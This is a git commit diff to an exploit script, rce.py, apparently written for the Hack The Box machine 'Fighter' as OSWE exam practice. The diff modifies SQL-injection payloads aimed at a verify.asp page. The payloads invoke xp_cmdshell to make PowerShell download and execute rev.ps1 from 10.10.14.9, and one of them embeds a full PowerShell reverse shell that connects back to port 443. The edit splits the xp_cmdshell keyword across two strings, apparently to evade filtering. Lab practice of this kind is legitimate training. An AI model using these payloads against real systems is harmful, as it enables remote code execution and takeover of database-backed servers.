20ad07aa244387e70a50b207f4acc1cc4a1ea0bd
agilfchx <agilfachrian2@gmail.com>
2024-04-21 21:10:17 +0700

    up gan

--- OSWE/Figther-HTB/rce.py
+++ OSWE/Figther-HTB/rce.py
@@ -4,10 +4,12 @@ from urllib.parse import quote_plus
 url = "http://members.streetfighterclub.htb/old/verify.asp"
 
 # download & access payload from nishang + escaping 
-payload1 = ";EXEC Xp_CmDsHeLl 'C:\Windows\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe \"IEX(New-Object Net.Webclient).downloadString(\\\"http://10.10.14.9/rev.ps1\\\")\"'"
+payload1 = ";EXEC Xp"
+payload1 += "_CmDsHeLl 'C:\Windows\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe \"IEX(New-Object Net.Webclient).downloadString(\\\"http://10.10.14.9/rev.ps1\\\")\"'"
 
 # using payload from revshells.com ( nc stuck :/ )
-payload2 = ";EXEC Xp_CmDsHeLl 'C:\Windows\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe \"$TCPClient = New-Object Net.Sockets.TCPClient(\\\"10.10.14.9\\\", 443); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\\\"$Output`n\\\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()\"'"
+payload2 = ";EXEC Xp"
+payload2 += "_CmDsHeLl 'C:\Windows\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe \"$TCPClient = New-Object Net.Sockets.TCPClient(\\\"10.10.14.9\\\", 443); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\\\"$Output`n\\\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()\"'"
 
 http_proxy = {'http':'http://127.0.0.1:8080'}
 
